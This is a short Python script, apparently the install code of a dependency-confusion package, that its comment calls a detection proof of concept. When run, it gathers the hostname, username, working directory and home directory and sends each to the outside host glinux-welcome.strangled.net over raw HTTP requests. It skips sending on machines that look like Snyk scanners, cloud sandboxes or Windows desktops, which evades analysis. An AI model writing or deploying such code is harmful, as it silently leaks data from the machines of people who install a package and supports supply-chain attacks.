import os
import socket
import getpass
import re

# This is PoC to detect dep confusion. Sends hostname, username, cwd and home dir name, nothing sensitive.

def s(p):
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("glinux-welcome.strangled.net", 80))
    s.sendall(f"GET /{p} HTTP/1.1\r\nUser-Agent: glinux-welcome-53\r\nHost: glinux-welcome.strangled.net\r\n\r\n".encode("utf-8"))


srv_host = socket.gethostname()
username = getpass.getuser()

if (username != "root" or not srv_host.startswith("ip-172-")) and "snyk" not in username and "snyk" not in srv_host and re.match(r"^DESKTOP-[A-Z0-9]{4,10}$", srv_host) is None and (username != "root" or re.match(r"^[a-f0-9]{11,13}$", srv_host) is None):
  s(f"a-{srv_host}")
  s(f"b-{username}")
  cwd = os.getcwd()
  s(f"c-{cwd}")
  homedir = os.path.expanduser("~")
  s(f"d-{homedir}")

